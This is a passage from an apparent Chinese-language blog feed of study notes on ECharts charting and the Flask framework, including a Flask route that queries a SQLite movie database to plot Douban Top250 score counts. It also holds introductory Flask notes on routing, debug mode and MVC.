<h2 id="快速上手-参考官方文档"><a href="#快速上手-参考官方文档" class="headerlink" title="快速上手-参考官方文档"></a>快速上手-参考官方文档</h2><h3 id="引入js文件"><a href="#引入js文件" class="headerlink" title="引入js文件"></a>引入js文件</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;!-- 引入 ECharts 文件 --&gt;</span><br><span class="line">    &lt;script src&#x3D;&quot;echarts.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<h3 id="绘制图表"><a href="#绘制图表" class="headerlink" title="绘制图表"></a>绘制图表</h3><p>绘制图表四步走</p>
<h4 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h4><p>绘图前要准备一个具备高宽的DOM容器来存放图表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;!-- 为 ECharts 准备一个具备大小（宽高）的 DOM --&gt;</span><br><span class="line">    &lt;div id&#x3D;&quot;main&quot; style&#x3D;&quot;width: 600px;height:400px;&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br></pre></td></tr></table></figure>

<h4 id="instance"><a href="#instance" class="headerlink" title="instance"></a>instance</h4><p>基于准备好的dom，通过echarts.init方法初始化一个echarts实例</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var myChart &#x3D; echarts.init(document.getElementById(&#39;main&#39;));</span><br></pre></td></tr></table></figure>

<h4 id="option"><a href="#option" class="headerlink" title="option"></a>option</h4><p>指定图表的配置项和数据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var option &#x3D; &#123;</span><br><span class="line">            title: &#123;</span><br><span class="line">                text: &#39;ECharts 入门示例&#39;</span><br><span class="line">            &#125;,</span><br><span class="line">            tooltip: &#123;&#125;,</span><br><span class="line">            legend: &#123;</span><br><span class="line">                data:[&#39;销量&#39;]</span><br><span class="line">            &#125;,</span><br><span class="line">            xAxis: &#123;</span><br><span class="line">                data: [&quot;衬衫&quot;,&quot;羊毛衫&quot;,&quot;雪纺衫&quot;,&quot;裤子&quot;,&quot;高跟鞋&quot;,&quot;袜子&quot;]</span><br><span class="line">            &#125;,</span><br><span class="line">            yAxis: &#123;&#125;,</span><br><span class="line">            series: [&#123;</span><br><span class="line">                name: &#39;销量&#39;,</span><br><span class="line">                type: &#39;bar&#39;,</span><br><span class="line">                data: [5, 20, 36, 10, 10, 20]</span><br><span class="line">            &#125;]</span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></figure>

<h4 id="setOption"><a href="#setOption" class="headerlink" title="setOption"></a>setOption</h4><p>最后通过setOption方法生成图表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">myChart.setOption(option);</span><br></pre></td></tr></table></figure>

<h4 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;ECharts&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;!-- 引入 echarts.js --&gt;</span><br><span class="line">    &lt;script src&#x3D;&quot;echarts.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;!-- 为ECharts准备一个具备大小（宽高）的Dom --&gt;</span><br><span class="line">    &lt;div id&#x3D;&quot;main&quot; style&#x3D;&quot;width: 600px;height:400px;&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">    &lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class="line">        &#x2F;&#x2F; 基于准备好的dom，初始化echarts实例</span><br><span class="line">        var myChart &#x3D; echarts.init(document.getElementById(&#39;main&#39;));</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 指定图表的配置项和数据</span><br><span class="line">        var option &#x3D; &#123;</span><br><span class="line">            title: &#123;</span><br><span class="line">                text: &#39;ECharts 入门示例&#39;</span><br><span class="line">            &#125;,</span><br><span class="line">            tooltip: &#123;&#125;,</span><br><span class="line">            legend: &#123;</span><br><span class="line">                data:[&#39;销量&#39;]</span><br><span class="line">            &#125;,</span><br><span class="line">            xAxis: &#123;</span><br><span class="line">                data: [&quot;衬衫&quot;,&quot;羊毛衫&quot;,&quot;雪纺衫&quot;,&quot;裤子&quot;,&quot;高跟鞋&quot;,&quot;袜子&quot;]</span><br><span class="line">            &#125;,</span><br><span class="line">            yAxis: &#123;&#125;,</span><br><span class="line">            series: [&#123;</span><br><span class="line">                name: &#39;销量&#39;,</span><br><span class="line">                type: &#39;bar&#39;,</span><br><span class="line">                data: [5, 20, 36, 10, 10, 20]</span><br><span class="line">            &#125;]</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 使用刚指定的配置项和数据显示图表。</span><br><span class="line">        myChart.setOption(option);</span><br><span class="line">    &lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<h3 id="应用实例"><a href="#应用实例" class="headerlink" title="应用实例"></a>应用实例</h3><p>我下载了echarts.min.js到本地，然后放到douban_flask项目的/static/assets/js文件夹下，然后在templates文件夹下新建了test文件夹，在test中把上面的代码复制到testEcharts.html，最后在app.py里写一个路由</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210516150421266.png" alt="image-20210516150421266"></p>
<p>成功显示图表：</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210516150437221.png" alt="image-20210516150437221"></p>
<h2 id="ECharts基础概念-参考官方文档"><a href="#ECharts基础概念-参考官方文档" class="headerlink" title="ECharts基础概念-参考官方文档"></a>ECharts基础概念-参考官方文档</h2><h3 id="echarts实例"><a href="#echarts实例" class="headerlink" title="echarts实例"></a>echarts实例</h3><p>一个网页中可以创建多个 <code>echarts 实例</code>。每个 <code>echarts 实例</code> 中可以创建多个图表和坐标系等等（用 <code>option</code> 来描述）。准备一个 DOM 节点（作为 echarts 的渲染容器），就可以在上面创建一个 echarts 实例。每个 echarts 实例独占一个 DOM 节点。</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210516142010595.png" alt="image-20210516142010595"></p>
<h3 id="系列-series"><a href="#系列-series" class="headerlink" title="系列(series)"></a>系列(series)</h3><p>系列是指一组数值以及他们映射成的图，一个系列包含的要素有：一组数值、图表类型(series.type)、以及其他的关于这些数据如何映射成图的参数</p>
<p>系列类型(series.type)有line(折线图)、bar(柱状图)、pie(饼图)等等</p>
<p>如图所示，option里声明了三个系列：pie、line、bar，每个系列都有各自的数据(series.data)</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210516142554936.png" alt="image-20210516142554936"></p>
<h3 id="组件-component"><a href="#组件-component" class="headerlink" title="组件(component)"></a>组件(component)</h3><p>echarts中各种内容被抽象为组件，比如：xAxis(直角坐标系X轴)、yAxis(直角坐标系Y轴)、dataZoom(数据缩放组件)、series(系列)等等。系列也是一种组件，系列是专门绘制”图”的组件</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210516143358078.png" alt="image-20210516143358078"></p>
<h3 id="用option描述图表"><a href="#用option描述图表" class="headerlink" title="用option描述图表"></a>用option描述图表</h3><p>option 表述了：数据、数据如何映射成图形、交互行为。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 创建 echarts 实例。</span><br><span class="line">var dom &#x3D; document.getElementById(&#39;dom-id&#39;);</span><br><span class="line">var chart &#x3D; echarts.init(dom);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 用 option 描述 &#96;数据&#96;、&#96;数据如何映射成图形&#96;、&#96;交互行为&#96; 等。</span><br><span class="line">&#x2F;&#x2F; option 是个大的 JavaScript 对象。</span><br><span class="line">var option &#x3D; &#123;</span><br><span class="line">    &#x2F;&#x2F; option 每个属性是一类组件。</span><br><span class="line">    legend: &#123;...&#125;,</span><br><span class="line">    grid: &#123;...&#125;,</span><br><span class="line">    tooltip: &#123;...&#125;,</span><br><span class="line">    toolbox: &#123;...&#125;,</span><br><span class="line">    dataZoom: &#123;...&#125;,</span><br><span class="line">    visualMap: &#123;...&#125;,</span><br><span class="line">    &#x2F;&#x2F; 如果有多个同类组件，那么就是个数组。例如这里有三个 X 轴。</span><br><span class="line">    xAxis: [</span><br><span class="line">        &#x2F;&#x2F; 数组每项表示一个组件实例，用 type 描述“子类型”。</span><br><span class="line">        &#123;type: &#39;category&#39;, ...&#125;,</span><br><span class="line">        &#123;type: &#39;category&#39;, ...&#125;,</span><br><span class="line">        &#123;type: &#39;value&#39;, ...&#125;</span><br><span class="line">    ],</span><br><span class="line">    yAxis: [&#123;...&#125;, &#123;...&#125;],</span><br><span class="line">    &#x2F;&#x2F; 这里有多个系列，也是构成一个数组。</span><br><span class="line">    series: [</span><br><span class="line">        &#x2F;&#x2F; 每个系列，也有 type 描述“子类型”，即“图表类型”。</span><br><span class="line">        &#123;type: &#39;line&#39;, data: [[&#39;AA&#39;, 332], [&#39;CC&#39;, 124], [&#39;FF&#39;, 412], ... ]&#125;,</span><br><span class="line">        &#123;type: &#39;line&#39;, data: [2231, 1234, 552, ... ]&#125;,</span><br><span class="line">        &#123;type: &#39;line&#39;, data: [[4, 51], [8, 12], ... ]&#125;</span><br><span class="line">    &#125;]</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 调用 setOption 将 option 输入 echarts，然后 echarts 渲染图表。</span><br><span class="line">chart.setOption(option);</span><br></pre></td></tr></table></figure>

<h3 id="组件定位"><a href="#组件定位" class="headerlink" title="组件定位"></a>组件定位</h3><p>不同的组件、系列，常有不同的定位</p>
<h4 id="类CSS的绝对定位"><a href="#类CSS的绝对定位" class="headerlink" title="类CSS的绝对定位"></a>类CSS的绝对定位</h4><p>多数组件和系列，都能够基于 <code>top</code> / <code>right</code> / <code>down</code> / <code>left</code> / <code>width</code> / <code>height</code> 绝对定位。 这种绝对定位的方式，类似于 <code>CSS</code> 的绝对定位（<code>position: absolute</code>）。绝对定位基于的是 echarts 容器 DOM 节点。他们的值可以是绝对数值(像素)或者是基于容器高宽的百分比</p>
<p>如下图的例子，对 <a href="https://echarts.apache.org/zh/option.html#grid" target="_blank" rel="noopener">grid</a> 组件（也就是直角坐标系的底板）设置 <code>left</code>、<code>right</code>、<code>height</code>、<code>bottom</code> 达到的效果。</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210516144515206.png" alt="image-20210516144515206"></p>
<p><code>left</code> <code>right</code> <code>width</code> 是一组（横向）、<code>top</code> <code>bottom</code> <code>height</code> 是另一组（纵向）。这两组没有什么关联。每组中，至多设置两项就可以了，第三项会被自动算出。</p>
<h4 id="中心半径定位"><a href="#中心半径定位" class="headerlink" title="中心半径定位"></a>中心半径定位</h4><p>少数圆形的组件或系列，可以使用“中心半径定位”，例如，<a href="https://echarts.apache.org/zh/option.html#series-pie" target="_blank" rel="noopener">pie</a>（饼图）、<a href="https://echarts.apache.org/zh/option.html#series-sunburst" target="_blank" rel="noopener">sunburst</a>（旭日图）、<a href="https://echarts.apache.org/zh/option.html#polar" target="_blank" rel="noopener">polar</a>（极坐标系）。</p>
<p>中心半径定位，往往依据 <a href="https://echarts.apache.org/zh/option.html#series-pie.center" target="_blank" rel="noopener">center</a>（中心）、<a href="https://echarts.apache.org/zh/option.html#series-pie.radius" target="_blank" rel="noopener">radius</a>（半径）来决定位置。</p>
<h4 id="其他定位"><a href="#其他定位" class="headerlink" title="其他定位"></a>其他定位</h4><p>少数组件和系列可能有自己的特殊的定位方式。在他们的文档中会有说明。</p>
<h3 id="坐标系"><a href="#坐标系" class="headerlink" title="坐标系"></a>坐标系</h3><p>很多系列需要运行在坐标系上，坐标系用于布局这些图，以及显示数据的刻度等等。echarts 中至少支持这些坐标系：<a href="https://echarts.apache.org/zh/option.html#grid" target="_blank" rel="noopener">直角坐标系</a>、<a href="https://echarts.apache.org/zh/option.html#polar" target="_blank" rel="noopener">极坐标系</a>、<a href="https://echarts.apache.org/zh/option.html#geo" target="_blank" rel="noopener">地理坐标系（GEO）</a>、<a href="https://echarts.apache.org/zh/option.html#singleAxis" target="_blank" rel="noopener">单轴坐标系</a>、<a href="https://echarts.apache.org/zh/option.html#calendar" target="_blank" rel="noopener">日历坐标系</a> 等</p>
<p>一个坐标系，可能由多个组件协作而成。比如直角坐标系中，包括有 <a href="https://echarts.apache.org/zh/option.html#xAxis" target="_blank" rel="noopener">xAxis</a>（直角坐标系 X 轴）、<a href="https://echarts.apache.org/zh/option.html#yAxis" target="_blank" rel="noopener">yAxis</a>（直角坐标系 Y 轴）、<a href="https://echarts.apache.org/zh/option.html#grid" target="_blank" rel="noopener">grid</a>（直角坐标系底板）三种组件。<code>xAxis</code>、<code>yAxis</code> 被 <code>grid</code> 自动引用并组织起来，共同工作。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.bilibili.com/video/BV12E411A7ZQ?p=34" target="_blank" rel="noopener">https://www.bilibili.com/video/BV12E411A7ZQ?p=34</a></p>
<p><a href="https://echarts.apache.org/zh/tutorial.html#5分钟上手ECharts" target="_blank" rel="noopener">https://echarts.apache.org/zh/tutorial.html#5%20%E5%88%86%E9%92%9F%E4%B8%8A%E6%89%8B%20ECharts</a></p>
<p><a href="https://echarts.apache.org/zh/tutorial.html#ECharts基础概念概览" target="_blank" rel="noopener">https://echarts.apache.org/zh/tutorial.html#ECharts%20%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5%E6%A6%82%E8%A7%88</a></p>
<p><a href="https://www.bilibili.com/video/BV12E411A7ZQ?p=35" target="_blank" rel="noopener">https://www.bilibili.com/video/BV12E411A7ZQ?p=35</a></p>
]]></content>
      <categories>
        <category>数据可视化</category>
      </categories>
  </entry>
  <entry>
    <title>数据可视化-Echarts应用</title>
    <url>/2021/05/16/Echarts-use/</url>
    <content><![CDATA[<p>前面看了下echarts的基础，现在用echarts来做一个显示电影评分的图在score.html上<a id="more"></a></p>
<h2 id="找图表"><a href="#找图表" class="headerlink" title="找图表"></a>找图表</h2><p><a href="https://echarts.apache.org/examples/zh/index.html" target="_blank" rel="noopener">https://echarts.apache.org/examples/zh/index.html</a> 在echarts官网实例里面找，我跟着老师找了一个<a href="https://echarts.apache.org/v4/examples/zh/editor.html?c=bar-simple" target="_blank" rel="noopener">Bar Simple</a> 的柱状图，这是一个最基本的柱状图内容非常少。跟着老师的学习方法：去看看别人的图表是怎么写的，有哪些内容可以借鉴，遇到不懂的组件直接在<a href="https://echarts.apache.org/zh/option.html#title" target="_blank" rel="noopener">文档的配置项查找</a> 就能知道作用了，多学习多看多借鉴多用就能很快上手。</p>
<p>比如，我想看看这个标题是怎么得到的，点击一下编辑就能看它是怎么写的了</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210516162717982.png" alt="image-20210516162717982"></p>
<p>可以看到里面有个title的值，这个就是标题，直接拿过来用就行了</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210516162817161.png" alt="image-20210516162817161"></p>
<p>title下面还有个tooltip，不知道是什么，直接去文档配置项查找看看，知道了是提示框组件，也可以拿来用用</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210516162917561.png" alt="image-20210516162917561"></p>
<p>grid之前入门的时候见过，好像是直角坐标系的底板，不清楚怎么用，也去文档配置项查查看</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210516163227935.png" alt="image-20210516163227935"></p>
<p>最后在Bar Simple的基础上加了title、tooltip、grid三个组件，结果如下</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210516163417491.png" alt="image-20210516163417491"></p>
<h2 id="应用到网页"><a href="#应用到网页" class="headerlink" title="应用到网页"></a>应用到网页</h2><p>可以直接复制左边的option代码，也可以点击右下角的download，把它的页面下载到本地查看</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210516163546549.png" alt="image-20210516163546549"></p>
<p>我直接把他下载到本地，然后加到douban_flask项目里的templates文件夹里，然后修改score.html，首先引入js文件，js文件路径要写对</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script src&#x3D;&quot;&#x2F;static&#x2F;assets&#x2F;js&#x2F;echarts.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>把Our Team Section里的标题改为’’豆瓣电影Top250评分分布图’’，把下面那段话去掉，把Counts Section里的四个图表div删除，然后在里面加入dom容器</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;div id&#x3D;&quot;main&quot; style&#x3D;&quot;width:100%;height:300px;&quot;&gt;&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure>

<p>最后在Footer上面加入script绘图代码，根据需要修改一下dom要获取的id值</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class="line">var dom &#x3D; document.getElementById(&quot;main&quot;);</span><br><span class="line">var myChart &#x3D; echarts.init(dom);</span><br><span class="line">var app &#x3D; &#123;&#125;;</span><br><span class="line">option &#x3D; null;</span><br><span class="line">option &#x3D; &#123;</span><br><span class="line">    title: &#123;</span><br><span class="line">        text: &#39;电影评分表&#39;</span><br><span class="line">    &#125;,</span><br><span class="line">    tooltip: &#123;</span><br><span class="line">        trigger: &#39;axis&#39;,</span><br><span class="line">        axisPointer: &#123;</span><br><span class="line">            type: &#39;shadow&#39;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    grid: &#123;</span><br><span class="line">        left: &#39;3%&#39;,</span><br><span class="line">        right: &#39;4%&#39;,</span><br><span class="line">        bottom: &#39;3%&#39;,</span><br><span class="line">        containLabel: true</span><br><span class="line">    &#125;,</span><br><span class="line">    xAxis: &#123;</span><br><span class="line">        type: &#39;category&#39;,</span><br><span class="line">        data: &#123;&#123; score &#125;&#125;  &#123;# 字符串用score|tojson #&#125;</span><br><span class="line">        &lt;!--[&#39;Mon&#39;, &#39;Tue&#39;, &#39;Wed&#39;, &#39;Thu&#39;, &#39;Fri&#39;, &#39;Sat&#39;, &#39;Sun&#39;]--&gt;</span><br><span class="line">    &#125;,</span><br><span class="line">    yAxis: &#123;</span><br><span class="line">        type: &#39;value&#39;</span><br><span class="line">    &#125;,</span><br><span class="line">    series: [&#123;</span><br><span class="line">        data: &#123;&#123; num &#125;&#125;,</span><br><span class="line">        &lt;!--[120, 200, 150, 80, 70, 110, 130],--&gt;</span><br><span class="line">        type: &#39;bar&#39;</span><br><span class="line">    &#125;]</span><br><span class="line">&#125;;</span><br><span class="line">;</span><br><span class="line">if (option &amp;&amp; typeof option &#x3D;&#x3D;&#x3D; &quot;object&quot;) &#123;</span><br><span class="line">    myChart.setOption(option, true);</span><br><span class="line">&#125;</span><br><span class="line">       &lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>在app.py里再加一个路由解析，把数据库里的score拿出来再做一个统计，然后传给score.html渲染</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@app.route(&#39;&#x2F;score&#39;)</span><br><span class="line">def score():</span><br><span class="line">    score&#x3D;[] #评分</span><br><span class="line">    num&#x3D;[] #每个评分所统计出的电影数量</span><br><span class="line">    con &#x3D; sqlite3.connect(&quot;movie.db&quot;)</span><br><span class="line">    cur &#x3D; con.cursor()</span><br><span class="line">    sql &#x3D; &quot;select score,count(score) from movie250 group by score&quot;</span><br><span class="line">    data &#x3D; cur.execute(sql)</span><br><span class="line">    for item in data:</span><br><span class="line">        score.append(item[0]) #字符串用str(item[0])</span><br><span class="line">        num.append(item[1])</span><br><span class="line">    cur.close()</span><br><span class="line">    con.close()</span><br><span class="line">    return render_template(&quot;score.html&quot;,score&#x3D;score,num&#x3D;num)</span><br></pre></td></tr></table></figure>

<p>因为echarts里的data是[xx,xx]这种类型的，很像python里的列表，所以新建两个列表，一个存评分，一个存各评分的电影数量，然后把数据库的score和count(score)查出来加到两个列表里，因为数据库里的score是数值型的，如果Echarts图表里的data需要数值型可以直接给他用，如果他要的是字符串，那要把把值用str()函数强制转换一下再放到列表里，但是这样处理的结果是score列表里有特殊字符，echarts图表显示不出来，需要用tojson过滤器(它的作用是将变量输出为JSON字符串)，把score列表转换成json格式，在模板里用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123; score|tojson &#125;&#125;</span><br></pre></td></tr></table></figure>

<p>这样就可以正常显示了。Jinja2能识别所有类型的变量，此外还可以用过滤器修改变量，过滤器名添加在变量名之后，中间用竖线分隔。上面这种用法就是过滤器</p>
<p>结果如下</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210516165502857.png" alt="image-20210516165502857"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.bilibili.com/video/BV12E411A7ZQ?p=35" target="_blank" rel="noopener">https://www.bilibili.com/video/BV12E411A7ZQ?p=35</a></p>
<p><a href="https://www.cnblogs.com/bmjoker/p/13508538.html" target="_blank" rel="noopener">https://www.cnblogs.com/bmjoker/p/13508538.html</a></p>
<p><a href="http://www.bjhee.com/jinja2-filter.html" target="_blank" rel="noopener">http://www.bjhee.com/jinja2-filter.html</a></p>
]]></content>
      <categories>
        <category>数据可视化</category>
      </categories>
  </entry>
  <entry>
    <title>数据可视化-Flask学习笔记1</title>
    <url>/2021/05/14/Flask1/</url>
    <content><![CDATA[<p>Flask框架比较轻便容易上手，适合入门学习，可以用来完成数据可视化项目<a id="more"></a></p>
<h2 id="关于Flask框架"><a href="#关于Flask框架" class="headerlink" title="关于Flask框架"></a>关于Flask框架</h2><p>Flask是一个使用Python编写的轻量级 Web 应用框架，其WSGI工具箱采用 Werkzeug ，模板引擎则使用 Jinja2 。它主要面向需求简单的小应用</p>
<p>可以说Flask框架的核心就是Werkzeug(请求路由转发)和Jinja2(模板渲染)</p>
<p>Flask其他几乎所有的功能(数据库访问、验证Web表单和用户身份认证等)，Flask框架是不支持的。但是可以用别人写好的扩展来实现</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210513221308588.png" alt="image-20210513221308588"></p>
<h3 id="基本模式"><a href="#基本模式" class="headerlink" title="基本模式"></a>基本模式</h3><p>Flask的基本模式为在程序里将一个视图函数分配给一个URL，每当用户访问这个URL时，系统就会执行给该URL分配好的视图函数，获取函数的返回值并将其显示到浏览器上，其工作过程见图。</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210514124735851.png" alt="image-20210514124735851"></p>
<h3 id="Web应用程序"><a href="#Web应用程序" class="headerlink" title="Web应用程序"></a>Web应用程序</h3><p>Flask作为Web框架，它的作用主要是为了开发Web应用程序。那么首先来了解下Web应用程</p>
<p>序。Web应用程序 (World Wide Web)诞生最初的目的，是为了利用互联网交流工作文档。</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210513220703372.png" alt="image-20210513220703372"></p>
<p>一切从客户端发起请求开始。</p>
<p>所有Flask程序都必须创建一个程序实例。</p>
<p>当客户端想要获取资源时，一般会通过浏览器发起HTTP请求。</p>
<p>此时，Web服务器使用一种名为WEB服务器网关接口的WSGI（Web Server Gateway Interface）</p>
<p>协议，把来自客户端的请求都交给Flask程序实例。</p>
<p>Flask使用Werkzeug来做路由分发（URL请求和视图函数之间的对应关系）。根据每个URL请求，</p>
<p>找到具体的视图函数。</p>
<p>在Flask程序中，路由一般是通过程序实例的装饰器实现。通过调用视图函数，获取到数据后，把</p>
<p>数据传入HTML模板文件中，模板引擎负责渲染HTTP响应数据，然后由Flask返回响应数据给浏览</p>
<p>器，最后浏览器显示返回的结果。</p>
<h2 id="Flask程序运行过程"><a href="#Flask程序运行过程" class="headerlink" title="Flask程序运行过程"></a>Flask程序运行过程</h2><p>所有Flask程序必须有一个程序实例。</p>
<p>Flask调用视图函数后，会将视图函数的返回值作为响应的内容，返回给客户端。一般情况下，响应</p>
<p>内容主要是字符串和状态码。</p>
<p>当客户端想要获取资源时，一般会通过浏览器发起HTTP请求。此时，Web服务器使用WSGI（Web</p>
<p>Server Gateway Interface）协议，把来自客户端的所有请求都交给Flask程序实例。WSGI是为 Python</p>
<p>语言定义的Web服务器和Web应用程序之间的一种简单而通用的接口，它封装了接受HTTP请求、解析</p>
<p>HTTP请求、发送HTTP，响应等等的这些底层的代码和操作，使开发者可以高效的编写Web应用。</p>
<p>程序实例使用Werkzeug来做路由分发（URL请求和视图函数之间的对应关系）。根据每个URL请</p>
<p>求，找到具体的视图函数。 在Flask程序中，路由的实现一般是通过程序实例的route装饰器实现。</p>
<p>route装饰器内部会调用add_url_route()方法实现路由注册。调用视图函数，获取响应数据后，把数据传入HTML模板文件中，模板引擎负责渲染响应数据，然后</p>
<p>由Flask返回响应数据给浏览器，最后浏览器处理返回的结果显示给客户端。</p>
<h2 id="为什么要用Web框架"><a href="#为什么要用Web框架" class="headerlink" title="为什么要用Web框架"></a>为什么要用Web框架</h2><p>web网站发展至今，特别是服务器端，涉及到的知识、内容，非常广泛。这对程序员的要求会越来越</p>
<p>高。如果采用成熟，稳健的框架，那么一些基础的工作，比如，网络操作、数据库访问、会话管理等都</p>
<p>可以让框架来处理，那么程序开发人员可以把精力放在具体的业务逻辑上面。使用Web框架开发Web应</p>
<p>用程序可以降低开发难度，提高开发效率。</p>
<p>总结一句话：避免重复造轮子。</p>
<h2 id="创建Flask项目"><a href="#创建Flask项目" class="headerlink" title="创建Flask项目"></a>创建Flask项目</h2><p>Pycharm里点击File下的New Project</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210513223115248.png" alt="image-20210513223115248"></p>
<p>选择Flask然后Create即可</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210513223210826.png" alt="image-20210513223210826"></p>
<p>项目目录如下图，其中static文件夹存放css、js文件用来提供网页的素材，templates里存放html网页文件</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210513223245858.png" alt="image-20210513223245858"></p>
<h2 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello World"></a>Hello World</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">from flask import Flask #导入Flask类</span><br><span class="line"></span><br><span class="line">app &#x3D; Flask(__name__) #初始化了一个对象,导入了flask框架</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#39;&#x2F;&#39;) #路由解析,通过用户访问的路径匹配相应的函数</span><br><span class="line">def hello_world():</span><br><span class="line">    return &#39;Hello World!&#39;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    app.run() #Flask应用程序实例的run方法启动WEB服务器</span><br></pre></td></tr></table></figure>

<p>flask默认监听5000端口，所以开启服务器后访问<code>http://127.0.0.1:5000</code>即可</p>
<h2 id="开启调试模式"><a href="#开启调试模式" class="headerlink" title="开启调试模式"></a>开启调试模式</h2><p>Debug模式的开启，可以更好的定位错误，还可以即时刷新修改的页面，不用重启服务器</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">app.run(debug&#x3D;True) #Pycharm中不起作用</span><br></pre></td></tr></table></figure>

<p>编辑配置里</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210513230141595.png" alt="image-20210513230141595"></p>
<p>勾选flask_debug然后apply应用就可以开启调试模式了</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210513230201618.png" alt="image-20210513230201618"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://baike.baidu.com/item/flask" target="_blank" rel="noopener">https://baike.baidu.com/item/flask</a></p>
<p><a href="https://www.bilibili.com/video/BV12E411A7ZQ?p=29" target="_blank" rel="noopener">https://www.bilibili.com/video/BV12E411A7ZQ?p=29</a></p>
]]></content>
      <categories>
        <category>数据可视化</category>
      </categories>
  </entry>
  <entry>
    <title>数据可视化-Flask学习笔记2</title>
    <url>/2021/05/15/Flask2/</url>
    <content><![CDATA[<p>前面基本了解了一下Flask框架，现在学习一下基础语法<a id="more"></a></p>
<h2 id="MVC架构"><a href="#MVC架构" class="headerlink" title="MVC架构"></a>MVC架构</h2><p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210515173849937.png" alt="image-20210515173849937"></p>
<blockquote>
<p>这就是传说中的MVC：Model-View-Controller，中文名“模型-视图-控制器”。<br>Python处理URL的函数就是C：Controller，Controller负责业务逻辑，比如检查用户名是否存在，取出用户信息等等；<br>包含变量的模板就是V：View，View负责显示逻辑，通过简单地替换一些变量，View最终输出的就是用户看到的HTML。<br>MVC中的Model在哪？Model是用来传给View的，这样View在替换变量的时候，就可以从Model中取出相应的数据。<br>——摘自第四篇参考文章</p>
</blockquote>
